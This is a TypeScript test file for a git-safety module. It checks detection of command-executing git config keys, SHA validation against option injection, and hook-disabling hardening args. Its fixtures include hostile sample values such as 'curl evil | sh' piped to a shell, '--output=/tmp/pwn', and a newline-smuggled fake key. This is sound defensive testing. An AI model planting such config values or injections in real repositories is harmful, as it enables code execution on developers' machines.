import { describe, expect, test } from 'vitest'
import { assertSha, findDangerousGitConfig, GIT_HARDENING_ARGS } from '../gitSafety'

/** `git config --null --list` framing: `key\nvalue\0` per entry (`key\0` when valueless). */
const nul = (entries: [string, string?][]): string =>
  entries.map(([k, v]) => (v === undefined ? `${k}\0` : `${k}\n${v}\0`)).join('')

describe('findDangerousGitConfig', () => {
  test('a stock `git init` config is clean', () => {
    const out = nul([
      ['core.repositoryformatversion', '0'],
      ['core.filemode', 'true'],
      ['core.bare', 'false'],
      ['core.logallrefupdates', 'true'],
      ['user.name', 'A Co-author'],
      ['remote.origin.url', 'git@github.com:x/y.git'],
      ['branch.main.remote', 'origin'],
    ])
    expect(findDangerousGitConfig(out)).toEqual([])
  })

  test('flags every command-executing key family', () => {
    const out = nul([
      ['filter.evil.clean', 'sh -c pwn'],
      ['filter.evil.smudge', 'sh -c pwn'],
      ['diff.tex.textconv', 'pwn'],
      ['diff.external', 'pwn'],
      ['diff.evil.command', 'pwn'],
      ['merge.evil.driver', 'pwn %O %A %B'],
      ['core.fsmonitor', '/tmp/pwn'],
      ['core.hookspath', '.githooks'],
      ['core.sshcommand', 'pwn'],
      ['gpg.program', 'pwn'],
      ['gpg.ssh.program', 'pwn'],
      ['gpg.x509.program', 'pwn'],
      ['core.worktree', '/Users/someone'],
    ])
    expect(findDangerousGitConfig(out).map((r) => r.key)).toEqual([
      'filter.evil.clean',
      'filter.evil.smudge',
      'diff.tex.textconv',
      'diff.external',
      'diff.evil.command',
      'merge.evil.driver',
      'core.fsmonitor',
      'core.hookspath',
      'core.sshcommand',
      'gpg.program',
      'gpg.ssh.program',
      'gpg.x509.program',
      'core.worktree',
    ])
  })

  test('matches case-insensitively on section + variable names', () => {
    const out = nul([['Core.hooksPath', 'x'], ['DIFF.External', 'y'], ['Filter.LFS.Clean', 'z']])
    expect(findDangerousGitConfig(out).map((r) => r.key)).toEqual([
      'Core.hooksPath',
      'DIFF.External',
      'Filter.LFS.Clean',
    ])
  })

  test('carries the value so the warning can show what would run', () => {
    expect(findDangerousGitConfig(nul([['filter.x.clean', 'curl evil | sh']]))).toEqual([
      { key: 'filter.x.clean', value: 'curl evil | sh' },
    ])
  })

  test('a value containing newlines cannot smuggle a fake key past the parser', () => {
    // With --null, a multi-line value stays inside one entry.
    const out = nul([['user.name', 'x\nfilter.fake.clean=y']])
    expect(findDangerousGitConfig(out)).toEqual([])
  })

  test('look-alike keys that execute nothing are not flagged', () => {
    const out = nul([
      ['diff.tex.xfuncname', '^\\\\section'],
      ['diff.renames', 'true'],
      ['merge.ff', 'false'],
      ['merge.evil.name', 'just a label'],
      ['gpg.format', 'ssh'],
      ['core.fsmonitorhookversion', '2'],
      ['core.editor', 'vim'],
    ])
    expect(findDangerousGitConfig(out)).toEqual([])
  })

  test('a boolean core.fsmonitor (builtin daemon / off) is not a command', () => {
    expect(findDangerousGitConfig(nul([['core.fsmonitor', 'false']]))).toEqual([])
    expect(findDangerousGitConfig(nul([['core.fsmonitor', 'true']]))).toEqual([])
    expect(findDangerousGitConfig(nul([['core.fsmonitor']]))).toEqual([]) // bare key = true
  })

  test('empty / unparsable output yields no risks', () => {
    expect(findDangerousGitConfig('')).toEqual([])
  })
})

describe('assertSha', () => {
  test('accepts abbreviated and full lowercase hex shas', () => {
    expect(assertSha('abc1234')).toBe('abc1234')
    expect(assertSha('4b825dc642cb6eb9a060e54bf8d69288fbee4904')).toBe('4b825dc642cb6eb9a060e54bf8d69288fbee4904')
  })

  test.each([
    ['option injection', '--output=/tmp/pwn'],
    ['a ref name', 'HEAD'],
    ['revision syntax', 'abc1234^'],
    ['too short', 'abc12'],
    ['too long', 'a'.repeat(41)],
    ['uppercase', 'ABC1234'],
    ['empty', ''],
    ['whitespace', 'abc1234 '],
  ])('rejects %s', (_label, sha) => {
    expect(() => assertSha(sha)).toThrow('INVALID_SHA')
  })

  test('rejects non-strings from the renderer', () => {
    expect(() => assertSha(42 as unknown as string)).toThrow('INVALID_SHA')
    expect(() => assertSha(undefined as unknown as string)).toThrow('INVALID_SHA')
  })
})

describe('GIT_HARDENING_ARGS', () => {
  test('disables fsmonitor and hooks for every invocation', () => {
    expect(GIT_HARDENING_ARGS).toEqual(['-c', 'core.fsmonitor=false', '-c', 'core.hooksPath=/dev/null'])
  })
})
